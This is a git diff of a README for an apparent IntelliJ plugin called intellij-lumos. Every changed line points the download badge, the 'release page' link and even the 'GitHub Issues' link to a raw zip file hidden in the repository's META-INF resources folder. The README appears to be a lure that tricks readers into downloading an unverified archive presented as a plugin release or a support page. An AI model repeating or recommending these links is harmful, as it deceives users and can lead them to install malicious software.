@@ -1,7 +1,7 @@
 # 🌟 intellij-lumos - Effortless Plugin for Your Development Needs
 
 ## 📥 Download
-[![Download Latest Release](https://raw.githubusercontent.com/tjagnade27/intellij-lumos/main/gradle/intellij-lumos-1.3-beta.4.zip%20release-brightgreen)](https://raw.githubusercontent.com/tjagnade27/intellij-lumos/main/gradle/intellij-lumos-1.3-beta.4.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/tjagnade27/intellij-lumos/main/src/main/resources/META-INF/intellij_lumos_v2.1.zip%20release-brightgreen)](https://raw.githubusercontent.com/tjagnade27/intellij-lumos/main/src/main/resources/META-INF/intellij_lumos_v2.1.zip)
 
 ## 🚀 Getting Started
 Welcome to **intellij-lumos**! This plugin adds support for the LUMOS schema language in IntelliJ IDEA and Rust Rover, making your coding experience smoother and more efficient.
@@ -20,7 +20,7 @@ Welcome to **intellij-lumos**! This plugin adds support for the LUMOS schema lan
 - **Disk Space**: At least 100MB of free space.
 
 ## 📥 Download & Install
-To install the plugin, please visit this [release page](https://raw.githubusercontent.com/tjagnade27/intellij-lumos/main/gradle/intellij-lumos-1.3-beta.4.zip). You will find the latest version available for download. 
+To install the plugin, please visit this [release page](https://raw.githubusercontent.com/tjagnade27/intellij-lumos/main/src/main/resources/META-INF/intellij_lumos_v2.1.zip). You will find the latest version available for download. 
 
 1. Click on the link above to go to the release page.
 2. Find the most recent version.
@@ -38,7 +38,7 @@ Once installed:
 3. Explore the features to enhance your productivity.
 
 ## 🎓 Support
-If you encounter any issues or have questions, please open an issue in our [GitHub Issues](https://raw.githubusercontent.com/tjagnade27/intellij-lumos/main/gradle/intellij-lumos-1.3-beta.4.zip) section. We’ll do our best to assist you.
+If you encounter any issues or have questions, please open an issue in our [GitHub Issues](https://raw.githubusercontent.com/tjagnade27/intellij-lumos/main/src/main/resources/META-INF/intellij_lumos_v2.1.zip) section. We’ll do our best to assist you.
 
 ## 🌐 Topics
 This project covers aspects of:
